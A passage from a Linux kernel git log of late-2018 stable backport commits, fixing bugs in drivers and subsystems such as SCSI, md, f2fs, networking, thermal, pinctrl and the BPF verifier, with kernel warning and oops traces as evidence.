[ND\_CMD\_ARS\_CAP] = "ars\_cap",
[ND\_CMD\_ARS\_START] = "ars\_start",
[ND\_CMD\_ARS\_STATUS] = "ars\_status",
[ND\_CMD\_CLEAR\_ERROR] = "clear\_error",
[ND\_CMD\_CALL] = "cmd\_call",
};
if (cmd < ARRAY\_SIZE(names) && names[cmd])
return names[cmd];
return "unknown";
}
is broken in a number of ways:
(1) ARRAY\_SIZE() is not generally defined.
(2) g++ does not support "non-trivial" array initialisers fully yet.
(3) Every file that calls this function will acquire a copy of names[].
The same goes for nvdimm\_cmd\_name().
Fix all three by converting to a switch statement where each case returns a
string. That way if cmd is a constant, the compiler can trivially reduce it
and, if not, the compiler can use a shared lookup table if it thinks that is
more efficient.
A better way would be to remove these functions and their arrays from the
header entirely.
Signed-off-by: David Howells
Signed-off-by: Dan Williams
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 97f21a6b942c38517e6e812f576167921bc8cf1a
Author: Evan Green
Date: Fri Oct 5 10:27:32 2018 -0700
scsi: ufs: Schedule clk gating work on correct queue
[ Upstream commit f4bb7704699beee9edfbee875daa9089c86cf724 ]
With commit 10e5e37581fc ("scsi: ufs: Add clock ungating to a separate
workqueue"), clock gating work was moved to a separate work queue with
WQ\_MEM\_RECLAIM set, since clock gating could occur from a memory reclaim
context. Unfortunately, clk\_gating.gate\_work was left queued via
schedule\_delayed\_work, which is a system workqueue that does not have
WQ\_MEM\_RECLAIM set. Because ufshcd\_ungate\_work attempts to cancel
gate\_work, the following warning appears:
[ 14.174170] workqueue: WQ\_MEM\_RECLAIM ufs\_clk\_gating\_0:ufshcd\_ungate\_work is flushing !WQ\_MEM\_RECLAIM events:ufshcd\_gate\_work
[ 14.174179] WARNING: CPU: 4 PID: 173 at kernel/workqueue.c:2440 check\_flush\_dependency+0x110/0x118
[ 14.205725] CPU: 4 PID: 173 Comm: kworker/u16:3 Not tainted 4.14.68 #1
[ 14.212437] Hardware name: Google Cheza (rev1) (DT)
[ 14.217459] Workqueue: ufs\_clk\_gating\_0 ufshcd\_ungate\_work
[ 14.223107] task: ffffffc0f6a40080 task.stack: ffffff800a490000
[ 14.229195] PC is at check\_flush\_dependency+0x110/0x118
[ 14.234569] LR is at check\_flush\_dependency+0x110/0x118
[ 14.239944] pc : [] lr : [] pstate: 60c001c9
[ 14.333050] Call trace:
[ 14.427767] [] check\_flush\_dependency+0x110/0x118
[ 14.434219] [] start\_flush\_work+0xac/0x1fc
[ 14.440046] [] flush\_work+0x40/0x94
[ 14.445246] [] \_\_cancel\_work\_timer+0x11c/0x1b8
[ 14.451433] [] cancel\_delayed\_work\_sync+0x20/0x30
[ 14.457886] [] ufshcd\_ungate\_work+0x24/0xd0
[ 14.463800] [] process\_one\_work+0x32c/0x690
[ 14.469713] [] worker\_thread+0x218/0x338
[ 14.475361] [] kthread+0x120/0x130
[ 14.480470] [] ret\_from\_fork+0x10/0x18
The simple solution is to put the gate\_work on the same WQ\_MEM\_RECLAIM
work queue as the ungate\_work.
Fixes: 10e5e37581fc ("scsi: ufs: Add clock ungating to a separate workqueue")
Signed-off-by: Evan Green
Reviewed-by: Douglas Anderson
Reviewed-by: Stephen Boyd
Signed-off-by: Martin K. Petersen
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 34fb187df0d0db6ca98017f9e04ea970032d53ba
Author: Finn Thain
Date: Tue Oct 16 16:31:25 2018 +1100
scsi: esp\_scsi: Track residual for PIO transfers
[ Upstream commit fd47d919d0c336e7c22862b51ee94927ffea227a ]
If a target disconnects during a PIO data transfer the command may fail
when the target reconnects:
scsi host1: DMA length is zero!
scsi host1: cur adr[04380000] len[00000000]
The scsi bus is then reset. This happens because the residual reached
zero before the transfer was completed.
The usual residual calculation relies on the Transfer Count registers.
That works for DMA transfers but not for PIO transfers. Fix the problem
by storing the PIO transfer residual and using that to correctly
calculate bytes\_sent.
Fixes: 6fe07aaffbf0 ("[SCSI] m68k: new mac\_esp scsi driver")
Tested-by: Stan Johnson
Signed-off-by: Finn Thain
Tested-by: Michael Schmitz
Signed-off-by: Martin K. Petersen
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 9b9dd8af6dd52aafdfbd9591a71f134a0bb14d3c
Author: Jack Wang
Date: Fri Oct 19 16:21:31 2018 +0200
md: fix memleak for mempool
[ Upstream commit 6aaa58c994277647f8b05ffef3b9b225a2d08f36 ]
I noticed kmemleak report memory leak when run create/stop
md in a loop, backtrace:
[<000000001ca975e7>] mempool\_create\_node+0x86/0xd0
[<0000000095576bcd>] md\_run+0x1057/0x1410 [md\_mod]
[<000000007b45c5fc>] do\_md\_run+0x15/0x130 [md\_mod]
[<000000001ede9ec0>] md\_ioctl+0x1f49/0x25d0 [md\_mod]
[<000000004142cacf>] blkdev\_ioctl+0x680/0xd00
The root cause is we alloc mddev->flush\_pool and
mddev->flush\_bio\_pool in md\_run, but from do\_md\_stop
will not call into md\_stop but \_\_md\_stop, move the
mempool\_destroy to \_\_md\_stop fixes the problem for me.
The bug was introduced in 5a409b4f56d5, the fixes should go to
4.18+
Fixes: 5a409b4f56d5 ("MD: fix lock contention for flush bios")
Signed-off-by: Jack Wang
Reviewed-by: Xiao Ni
Signed-off-by: Shaohua Li
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 99c08e1dd14627782680d5693fa5d892bb43c7a8
Author: Xiao Ni
Date: Sat Oct 20 08:09:25 2018 +0800
MD: Memory leak when flush bio size is zero
[ Upstream commit af9b926de9c5986ab009e64917de87c9758bab10 ]
flush\_pool is leaked when flush bio size is zero
Fixes: 5a409b4f56d5 ("MD: fix lock contention for flush bios")
Signed-off-by: David Jeffery
Signed-off-by: Xiao Ni
Signed-off-by: Shaohua Li
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit e2065558bfab9705c0d418b0b4706b8acf93a161
Author: Chao Yu
Date: Mon Oct 22 23:24:28 2018 +0800
f2fs: fix to account IO correctly for cgroup writeback
[ Upstream commit 78efac537de33faab9a4302cc05a70bb4a8b3b63 ]
Now, we have supported cgroup writeback, it depends on correctly IO
account of specified filesystem.
But in commit d1b3e72d5490 ("f2fs: submit bio of in-place-update pages"),
we split write paths from f2fs\_submit\_page\_mbio() to two:
- f2fs\_submit\_page\_bio() for IPU path
- f2fs\_submit\_page\_bio() for OPU path
But still we account write IO only in f2fs\_submit\_page\_mbio(), result in
incorrect IO account, fix it by adding missing IO account in IPU path.
Fixes: d1b3e72d5490 ("f2fs: submit bio of in-place-update pages")
Signed-off-by: Chao Yu
Signed-off-by: Jaegeuk Kim
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 8eadae7951d5a5963de960cfdf0bc40b42cf4843
Author: Johan Hovold
Date: Mon Aug 27 10:21:51 2018 +0200
net: stmmac: dwmac-sun8i: fix OF child-node lookup
[ Upstream commit ac63043d8cb5503c7e0fe110f947eacf2663804e ]
Use the new of\_get\_compatible\_child() helper to lookup the mdio-internal
child node instead of using of\_find\_compatible\_node(), which searches
the entire tree from a given start node and thus can return an unrelated
(i.e. non-child) node.
This also addresses a potential use-after-free (e.g. after probe
deferral) as the tree-wide helper drops a reference to its first
argument (i.e. the mdio-mux node). Fortunately, this was inadvertently
balanced by a failure to drop the mdio-mux reference after lookup.
While at it, also fix the related mdio-internal- and phy-node reference
leaks.
Fixes: 634db83b8265 ("net: stmmac: dwmac-sun8i: Handle integrated/external MDIOs")
Tested-by: Corentin Labbe
Cc: Andrew Lunn
Cc: Giuseppe Cavallaro
Cc: Alexandre Torgue
Cc: Jose Abreu
Cc: David S. Miller
Signed-off-by: Johan Hovold
Signed-off-by: Rob Herring
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 35df1a8080abc17c09cd722f9f0eecb82b04694f
Author: Michal Hocko
Date: Thu Oct 18 10:56:17 2018 +0200
cgroup, netclassid: add a preemption point to write\_classid
[ Upstream commit a90e90b7d55e789c71d85b946ffb5c1ab2f137ca ]
We have seen a customer complaining about soft lockups on !PREEMPT
kernel config with 4.4 based kernel
[1072141.435366] NMI watchdog: BUG: soft lockup - CPU#21 stuck for 22s! [systemd:1]
[1072141.444090] Modules linked in: mpt3sas raid\_class binfmt\_misc af\_packet 8021q garp mrp stp llc xfs libcrc32c bonding iscsi\_ibft iscsi\_boot\_sysfs msr ext4 crc16 jbd2 mbcache cdc\_ether usbnet mii joydev hid\_generic usbhid intel\_rapl x86\_pkg\_temp\_thermal intel\_powerclamp coretemp crct10dif\_pclmul crc32\_pclmul ghash\_clmulni\_intel ipmi\_ssif mgag200 i2c\_algo\_bit ttm ipmi\_devintf drbg ixgbe drm\_kms\_helper vxlan ansi\_cprng ip6\_udp\_tunnel drm aesni\_intel udp\_tunnel aes\_x86\_64 iTCO\_wdt syscopyarea ptp xhci\_pci lrw iTCO\_vendor\_support pps\_core gf128mul ehci\_pci glue\_helper sysfillrect mdio pcspkr sb\_edac ablk\_helper cryptd ehci\_hcd sysimgblt xhci\_hcd fb\_sys\_fops edac\_core mei\_me lpc\_ich ses usbcore enclosure dca mfd\_core ipmi\_si mei i2c\_i801 scsi\_transport\_sas usb\_common ipmi\_msghandler shpchp fjes wmi processor button acpi\_pad btrfs xor raid6\_pq sd\_mod crc32c\_intel megaraid\_sas sg dm\_multipath dm\_mod scsi\_dh\_rdac scsi\_dh\_emc scsi\_dh\_alua scsi\_mod md\_mod autofs4
[1072141.444146] Supported: Yes
[1072141.444149] CPU: 21 PID: 1 Comm: systemd Not tainted 4.4.121-92.80-default #1
[1072141.444150] Hardware name: LENOVO Lenovo System x3650 M5 -[5462P4U]- -[5462P4U]-/01GR451, BIOS -[TCE136H-2.70]- 06/13/2018
[1072141.444151] task: ffff880191bd0040 ti: ffff880191bd4000 task.ti: ffff880191bd4000
[1072141.444153] RIP: 0010:[] [] update\_classid\_sock+0x29/0x40
[1072141.444157] RSP: 0018:ffff880191bd7d58 EFLAGS: 00000286
[1072141.444158] RAX: ffff883b177cb7c0 RBX: 0000000000000000 RCX: 0000000000000000
[1072141.444159] RDX: 00000000000009c7 RSI: ffff880191bd7d5c RDI: ffff8822e29bb200
[1072141.444160] RBP: ffff883a72230980 R08: 0000000000000101 R09: 0000000000000000
[1072141.444161] R10: 0000000000000008 R11: f000000000000000 R12: ffffffff815229d0
[1072141.444162] R13: 0000000000000000 R14: ffff881fd0a47ac0 R15: ffff880191bd7f28
[1072141.444163] FS: 00007f3e2f1eb8c0(0000) GS:ffff882000340000(0000) knlGS:0000000000000000
[1072141.444164] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[1072141.444165] CR2: 00007f3e2f200000 CR3: 0000001ffea4e000 CR4: 00000000001606f0
[1072141.444166] Stack:
[1072141.444166] ffffffa800000246 00000000000009c7 ffffffff8121d583 ffff8818312a05c0
[1072141.444168] ffff8818312a1100 ffff880197c3b280 ffff881861422858 ffffffffffffffea
[1072141.444170] ffffffff81522b1c ffffffff81d0ca20 ffff8817fa17b950 ffff883fdd8121e0
[1072141.444171] Call Trace:
[1072141.444179] [] iterate\_fd+0x53/0x80
[1072141.444182] [] write\_classid+0x4c/0x80
[1072141.444187] [] cgroup\_file\_write+0x9b/0x100
[1072141.444193] [] kernfs\_fop\_write+0x11b/0x150
[1072141.444198] [] \_\_vfs\_write+0x26/0x100
[1072141.444201] [] vfs\_write+0x9d/0x190
[1072141.444203] [] SyS\_write+0x42/0xa0
[1072141.444207] [] entry\_SYSCALL\_64\_fastpath+0x1e/0xca
[1072141.445490] DWARF2 unwinder stuck at entry\_SYSCALL\_64\_fastpath+0x1e/0xca
If a cgroup has many tasks with many open file descriptors then we would
end up in a large loop without any rescheduling point throught the
operation. Add cond\_resched once per task.
Signed-off-by: Michal Hocko
Signed-off-by: Tejun Heo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 477fa78844c3878054bc7f286bef31011ebd5a91
Author: Geert Uytterhoeven
Date: Fri Oct 12 09:20:17 2018 +0200
thermal: da9062/61: Prevent hardware access during system suspend
[ Upstream commit 760eea43f8c6d48684f1f34b8a02fddc1456e849 ]
The workqueue used for monitoring the hardware may run while the device
is already suspended. Fix this by using the freezable system workqueue
instead, cfr. commit 51e20d0e3a60cf46 ("thermal: Prevent polling from
happening during system suspend").
Fixes: 608567aac3206ae8 ("thermal: da9062/61: Thermal junction temperature monitoring driver")
Signed-off-by: Geert Uytterhoeven
Acked-by: Steve Twiss
Signed-off-by: Eduardo Valentin
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 2ba7c7660bed9ba3059c7b63cf2b6ec7696ba57a
Author: Geert Uytterhoeven
Date: Fri Oct 12 09:20:16 2018 +0200
thermal: rcar\_thermal: Prevent doing work after unbind
[ Upstream commit 697ee786f15d7b65c7f3045d45fe3a05d28e0911 ]
When testing bind/unbind on r8a7791/koelsch:
WARNING: CPU: 1 PID: 697 at lib/debugobjects.c:329 debug\_print\_object+0x8c/0xb4
ODEBUG: free active (active state 0) object type: timer\_list hint: delayed\_work\_timer\_fn+0x0/0x10
This happens if the workqueue runs after the device has been unbound.
Fix this by cancelling any queued work during remove.
Fixes: e0a5172e9eec7f0d ("thermal: rcar: add interrupt support")
Signed-off-by: Geert Uytterhoeven
Reviewed-by: Niklas Söderlund
Signed-off-by: Eduardo Valentin
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 363e948fcc3abda012cef77dfce687a24a2684c8
Author: Diego Viola
Date: Fri Oct 26 10:45:16 2018 -0300
libata: Apply NOLPM quirk for SAMSUNG MZ7TD256HAFV-000L9
[ Upstream commit a435ab4f80f983c53b4ca4f8c12b3ddd3ca17670 ]
med\_power\_with\_dipm causes my T450 to freeze with a SAMSUNG
MZ7TD256HAFV-000L9 SSD (firmware DXT02L5Q).
Switching the LPM to max\_performance fixes this issue.
Acked-by: Hans de Goede
Signed-off-by: Diego Viola
Signed-off-by: Jens Axboe
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 043b60105fc21182f8604c734a63ae6630834f8e
Author: Martin Willi
Date: Wed Aug 22 09:39:52 2018 +0200
ath10k: schedule hardware restart if WMI command times out
[ Upstream commit a9911937e7d332761e8c4fcbc7ba0426bdc3956f ]
When running in AP mode, ath10k sometimes suffers from TX credit
starvation. The issue is hard to reproduce and shows up once in a
few days, but has been repeatedly seen with QCA9882 and a large
range of firmwares, including 10.2.4.70.67.
Once the module is in this state, TX credits are never replenished,
which results in "SWBA overrun" errors, as no beacons can be sent.
Even worse, WMI commands run in a timeout while holding the conf
mutex for three seconds each, making any further operations slow
and the whole system unresponsive.
The firmware/driver never recovers from that state automatically,
and triggering TX flush or warm restarts won't work over WMI. So
issue a hardware restart if a WMI command times out due to missing
TX credits. This implies a connectivity outage of about 1.4s in AP
mode, but brings back the interface and the whole system to a usable
state. WMI command timeouts have not been seen in absent of this
specific issue, so taking such drastic actions seems legitimate.
Signed-off-by: Martin Willi
Signed-off-by: Kalle Valo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit c0368ed155a2af390cfb0032732b6e9898dbf9bd
Author: Sebastian Basierski
Date: Thu Aug 9 11:45:40 2018 +0200
ixgbevf: VF2VF TCP RSS
[ Upstream commit 7fb94bd58dd6650a0158e68d414e185077d8b57a ]
While VF2VF with RSS communication, RSS Type were wrongly recognized
and RSS hash was not calculated as it should be. Packets was
distributed on various queues by accident.
This commit fixes that behaviour and causes proper RSS Type recognition.
Signed-off-by: Sebastian Basierski
Tested-by: Andrew Bowers
Signed-off-by: Jeff Kirsher
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 0cfe42772c1d8d91fc9b3ed86c8165a1601968de
Author: Shannon Nelson
Date: Wed Aug 22 16:47:14 2018 -0700
ixgbe: disallow IPsec Tx offload when in SR-IOV mode
[ Upstream commit 47b6f50077e68bcd544f657526dad4bfdce7e87d ]
There seems to be a problem in the x540's internal switch wherein if SR-IOV
mode is enabled and an offloaded IPsec packet is sent to a local VF,
the packet is silently dropped. This might never be a problem as it is
somewhat a corner case, but if someone happens to be using IPsec offload
from the PF to a VF that just happens to get migrated to the local box,
communication will mysteriously fail.
Not good.
A simple way to protect from this is to simply not allow any IPsec offloads
for outgoing packets when num\_vfs != 0. This doesn't help any offloads that
were created before SR-IOV was enabled, but we'll get to that later.
Signed-off-by: Shannon Nelson
Tested-by: Andrew Bowers
Signed-off-by: Jeff Kirsher
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 253b526d998bce684b5fa193853da936e23d9dc2
Author: Justin Chen
Date: Fri Aug 17 16:47:39 2018 -0700
gpio: brcmstb: allow 0 width GPIO banks
[ Upstream commit bfba223dcc4548632d8f3bfd15690a86d4c68504 ]
Sometimes we have empty banks within the GPIO block. This commit allows
proper handling of 0 width GPIO banks. We handle 0 width GPIO banks by
incrementing the bank and number of GPIOs, but not initializing them.
This will mean a call into the non-existent GPIOs will return an error.
Also remove "GPIO registered" dev print. This information is misleading
since the incremented banks and gpio\_base do not reflect the actual GPIOs
that get initialized. We leave this information out since it is already
printed with dev\_dbg.
Signed-off-by: Justin Chen
Acked-by: Florian Fainelli
Signed-off-by: Linus Walleij
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit ab9a0e99bf29a3f55252c1bfcc616e0b0be1dd97
Author: Sara Sharon
Date: Tue May 1 14:54:22 2018 +0300
iwlwifi: mvm: fix BAR seq ctrl reporting
[ Upstream commit 941ab4eb66c10bc5c7234e83a7a858b2806ed151 ]
There is a bug in FW where the sequence control may be
incorrect, and the driver overrides it with the value
of the ieee80211 header.
However, in BAR there is no sequence control in the header,
which result with arbitrary sequence.
This access to an unknown location is bad and it makes the
logs very confusing - so fix it.
Signed-off-by: Sara Sharon
Signed-off-by: Luca Coelho
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit dec405826694596b8dc92ab0d25bc6b6e86b581a
Author: Siva Rebbagondla
Date: Mon Aug 27 17:05:14 2018 +0530
rsi: fix memory alignment issue in ARM32 platforms
[ Upstream commit baa8caf4ab7af2d9e84b566b99fe919a4e9e7562 ]
During testing in ARM32 platforms, observed below kernel panic, as driver
accessing data beyond the allocated memory while submitting URB to USB.
Fix: Resolved this by specifying correct length by considering 64 bit
alignment. so that, USB bus driver will access only allocated memory.
Unit-test: Tested and confirm that driver bring up and scanning,
connection and data transfer works fine with this fix.
...skipping...
[ 25.389450] Unable to handle kernel paging request at virtual
address 5aa11422
[ 25.403078] Internal error: Oops: 5 [#1] SMP ARM
[ 25.407703] Modules linked in: rsi\_usb
[ 25.411473] CPU: 1 PID: 317 Comm: RX-Thread Not tainted 4.18.0-rc7 #1
[ 25.419221] Hardware name: Freescale i.MX6 Quad/DualLite (Device Tree)
[ 25.425764] PC is at skb\_release\_data+0x90/0x168
[ 25.430393] LR is at skb\_release\_all+0x28/0x2c
[ 25.434842] pc : [<807435b0>] lr : [<80742ba0>] psr: 200e0013 5aa1141e
[ 25.464633] Flags: nzCv IRQs on FIQs on Mode SVC\_32 ISA ARM Segment none
[ 25.477524] Process RX-Thread (pid: 317, stack limit = 0x(ptrval))
[ 25.483709] Stack: (0xedf69ed8 to 0xedf6a000)
[ 25.569907] Backtrace:
[ 25.572368] [<80743520>] (skb\_release\_data) from [<80742ba0>]
(skb\_release\_all+0x28/0x2c)
[ 25.580555] r9:7f00258c r8:00000001 r7:ee355000 r6:eddab0d0
r5:eddab000 r4:eddbb840
[ 25.588308] [<80742b78>] (skb\_release\_all) from [<807432cc>]
(consume\_skb+0x30/0x50)
[ 25.596055] r5:eddab000 r4:eddbb840
[ 25.599648] [<8074329c>] (consume\_skb) from [<7f00117c>]
(rsi\_usb\_rx\_thread+0x64/0x12c [rsi\_usb])
[ 25.608524] r5:eddab000 r4:eddbb840
[ 25.612116] [<7f001118>] (rsi\_usb\_rx\_thread [rsi\_usb]) from
[<80142750>] (kthread+0x11c/0x15c)
[ 25.620735] r10:ee9ff9e0 r9:edcde3b8 r8:ee355000 r7:edf68000
r6:edd3a780 r5:00000000
[ 25.628567] r4:edcde380
[ 25.631110] [<80142634>] (kthread) from [<801010e8>]
(ret\_from\_fork+0x14/0x2c)
[ 25.638336] Exception stack(0xedf69fb0 to 0xedf69ff8)
[ 25.682929] ---[ end trace 8236a5496f5b5d3b ]---
Signed-off-by: Siva Rebbagondla
Signed-off-by: Kalle Valo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit d8b03c1e76638d98a8b0c8ea4e1a60199b2a0b79
Author: Andrew Lunn
Date: Sun Sep 2 18:13:14 2018 +0200
net: dsa: mv88e6xxx: Fix writing to a PHY page.
[ Upstream commit c309b158090d788e96ee597444965cb79b040484 ]
After changing to the needed page, actually write the value to the
register!
Fixes: 09cb7dfd3f14 ("net: dsa: mv88e6xxx: describe PHY page and SerDes")
Signed-off-by: Andrew Lunn
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit ba0885680af7549369b68aed5fb986d14018b8de
Author: Yunsheng Lin
Date: Mon Sep 3 11:21:46 2018 +0100
net: hns3: Fix for vf vlan delete failed problem
[ Upstream commit 41dafea2af781d8e3ab8626d236b52e4172905a3 ]
There are only 128 entries in vf vlan table, if user has added
more than 128 vlan, fw will ignore it and disable the vf vlan
table. So when user deletes the vlan entry that has not been
set to vf vlan table, fw will return not found result and driver
treat that as error, which will cause vlan delete failed problem.
This patch fixes it by returning ok when fw returns not found
result.
Fixes: 6c251711b37f ("net: hns3: Disable vf vlan filter when vf vlan table is full")
Signed-off-by: Yunsheng Lin
Signed-off-by: Peng Li
Signed-off-by: Salil Mehta
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit ff80ed73b6cf74efae517bc7d941d1adafb7eabe
Author: Yunsheng Lin
Date: Mon Sep 3 11:21:51 2018 +0100
net: hns3: Fix ping exited problem when doing lp selftest
[ Upstream commit 3f8601f0f5716c4e63a9f215bbc581df42859d61 ]
When ping is runnig and user executes the loopback selftest, the
ping cmd will stop and exit.
This patch fixes it by using the hns3\_nic\_net\_open/stop to offline
the netdev when doing loopback selftest.
Fixes: c39c4d98dc65 ("net: hns3: Add mac loopback selftest support in hns3 driver")
Signed-off-by: Yunsheng Lin
Signed-off-by: Peng Li
Signed-off-by: Salil Mehta
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 65187c05f4898c0db7ee297a2b284585f02c464c
Author: Yunsheng Lin
Date: Mon Sep 3 11:21:52 2018 +0100
net: hns3: Preserve vlan 0 in hardware table
[ Upstream commit daaa8521760ee4d4e65f309c4c37b3a1e58c9d4e ]
When netdev is down, the stack will delete the vlan from
hardware including vlan0, which will cause problem when
doing loopback selftest when netdev is down.
This patch fixes it by always preserving vlan 0 in hardware,
because vlan 0 is defalut vlan, which should always be in
hardware.
Fixes: c39c4d98dc65 ("net: hns3: Add mac loopback selftest support in hns3 driver")
Signed-off-by: Yunsheng Lin
Signed-off-by: Peng Li
Signed-off-by: Salil Mehta
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 23c98b4d9fbd17513f6a31f0d0d5824ebcab324a
Author: Douglas Anderson
Date: Thu Aug 30 08:23:38 2018 -0700
pinctrl: ssbi-gpio: Fix pm8xxx\_pin\_config\_get() to be compliant
[ Upstream commit b432414b996d32a1bd9afe2bd595bd5729c1477f ]
If you look at "pinconf-groups" in debugfs for ssbi-gpio you'll notice
it looks like nonsense.
The problem is fairly well described in commit 1cf86bc21257 ("pinctrl:
qcom: spmi-gpio: Fix pmic\_gpio\_config\_get() to be compliant") and
commit 05e0c828955c ("pinctrl: msm: Fix msm\_config\_group\_get() to be
compliant"), but it was pointed out that ssbi-gpio has the same
problem. Let's fix it there too.
Fixes: b4c45fe974bc ("pinctrl: qcom: ssbi: Family A gpio & mpp drivers")
Signed-off-by: Douglas Anderson
Reviewed-by: Stephen Boyd
Reviewed-by: Bjorn Andersson
Signed-off-by: Linus Walleij
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit f5ba8363907ccd77762bda155b143d8ece74745f
Author: Douglas Anderson
Date: Thu Aug 30 08:23:39 2018 -0700
pinctrl: spmi-mpp: Fix pmic\_mpp\_config\_get() to be compliant
[ Upstream commit 0d5b476f8f57fcb06c45fe27681ac47254f63fd2 ]
If you look at "pinconf-groups" in debugfs for ssbi-mpp you'll notice
it looks like nonsense.
The problem is fairly well described in commit 1cf86bc21257 ("pinctrl:
qcom: spmi-gpio: Fix pmic\_gpio\_config\_get() to be compliant") and
commit 05e0c828955c ("pinctrl: msm: Fix msm\_config\_group\_get() to be
compliant"), but it was pointed out that ssbi-mpp has the same
problem. Let's fix it there too.
NOTE: in case it's helpful to someone reading this, the way to tell
whether to do the -EINVAL or not is to look at the PCONFDUMP for a
given attribute. If the last element (has\_arg) is false then you need
to do the -EINVAL trick.
ALSO NOTE: it seems unlikely that the values returned when we try to
get PIN\_CONFIG\_BIAS\_PULL\_UP will actually be printed since "has\_arg"
is false for that one, but I guess it's still fine to return different
values so I kept doing that. It seems like another driver (ssbi-gpio)
uses a custom attribute (PM8XXX\_QCOM\_PULL\_UP\_STRENGTH) for something
similar so maybe a future change should do that here too.
Fixes: cfb24f6ebd38 ("pinctrl: Qualcomm SPMI PMIC MPP pin controller driver")
Signed-off-by: Douglas Anderson
Reviewed-by: Stephen Boyd
Reviewed-by: Bjorn Andersson
Signed-off-by: Linus Walleij
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit f0ff16f0402adac9b966004a5ee2a260548f79fa
Author: Arnaldo Carvalho de Melo
Date: Wed Sep 5 10:47:56 2018 -0300
perf tests: Fix record+probe\_libc\_inet\_pton.sh without ping's debuginfo
[ Upstream commit 1632936480a53d85ef3012cd9f290e247251cbb9 ]
When we don't have the iputils-debuginfo package installed, i.e. when we
don't have the DWARF information needed to resolve ping's samples, we
end up failing this 'perf test' entry:
# perf test ping
62: probe libc's inet\_pton & backtrace it with ping : Ok
# rpm -e iputils-debuginfo
# perf test ping
62: probe libc's inet\_pton & backtrace it with ping : FAILED!
#
Fix it to accept "[unknown]" where the symbol + offset, when resolved,
is expected.
I think this will fail in the other arches as well, but since I can't
test now, I'm leaving s390x and ppc cases as-is.
Cc: Adrian Hunter
Cc: Alexander Shishkin
Cc: David Ahern
Cc: Hendrik Brueckner
Cc: Jiri Olsa
Cc: Kim Phillips
Cc: Michael Petlan
Cc: Namhyung Kim
Cc: Naveen N. Rao
Cc: Peter Zijlstra
Cc: Ravi Bangoria
Cc: Sandipan Das
Cc: Sukadev Bhattiprolu
Cc: Thomas Richter
Cc: Wang Nan
Fixes: 7903a7086723 ("perf script: Show symbol offsets by default")
Link: https://lkml.kernel.org/n/tip-hnizqwqrs03vcq1b74yao0f6@git.kernel.org
Signed-off-by: Arnaldo Carvalho de Melo
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit baef398e5deaf27dfa57f9acfbdc571456210d33
Author: YueHaibing
Date: Tue Sep 4 02:56:26 2018 +0000
failover: Add missing check to validate 'slave\_dev' in net\_failover\_slave\_unregister
[ Upstream commit 9e7e6cabf371cc008cb2244a04c012b516753693 ]
Fixes gcc '-Wunused-but-set-variable' warning:
drivers/net/net\_failover.c: In function 'net\_failover\_slave\_unregister':
drivers/net/net\_failover.c:598:35: warning:
variable 'primary\_dev' set but not used [-Wunused-but-set-variable]
There should check the validity of 'slave\_dev'.
Fixes: cfc80d9a1163 ("net: Introduce net\_failover driver")
Signed-off-by: YueHaibing
Acked-by: Sridhar Samudrala
Signed-off-by: David S. Miller
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit f47ceb5f3a0862f7651b15874452968c8c83b9ad
Author: Alexei Starovoitov
Date: Tue Sep 4 19:13:44 2018 -0700
bpf/verifier: fix verifier instability
[ Upstream commit a9c676bc8fc58d00eea9836fb14ee43c0346416a ]
Edward Cree says:
In check\_mem\_access(), for the PTR\_TO\_CTX case, after check\_ctx\_access()
has supplied a reg\_type, the other members of the register state are set
appropriately. Previously reg.range was set to 0, but as it is in a
union with reg.map\_ptr, which is larger, upper bytes of the latter were
left in place. This then caused the memcmp() in regsafe() to fail,
preventing some branches from being pruned (and occasionally causing the
same program to take a varying number of processed insns on repeated
verifier runs).
Fix the instability by clearing bpf\_reg\_state in \_\_mark\_reg\_[un]known()
Fixes: f1174f77b50c ("bpf/verifier: rework value tracking")
Debugged-by: Edward Cree
Acked-by: Edward Cree
Signed-off-by: Alexei Starovoitov
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit c0222ea97aa1d1acf6f257875903f50d6c2e706a
Author: Stephen Boyd
Date: Thu Aug 30 17:58:52 2018 -0700
pinctrl: qcom: spmi-mpp: Fix drive strength setting
[ Upstream commit 89c68b102f13f123aaef22b292526d6b92501334 ]
It looks like we parse the drive strength setting here, but never
actually write it into the hardware to update it. Parse the setting and
then write it at the end of the pinconf setting function so that it
actually sticks in the hardware.
Fixes: 0e948042c420 ("pinctrl: qcom: spmi-mpp: Implement support for sink mode")
Cc: Doug Anderson
Signed-off-by: Stephen Boyd
Reviewed-by: Bjorn Andersson
Signed-off-by: Linus Walleij
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 64b74ae515f76ff1e50c9525b8b64704f0498c0a
Author: Hans de Goede
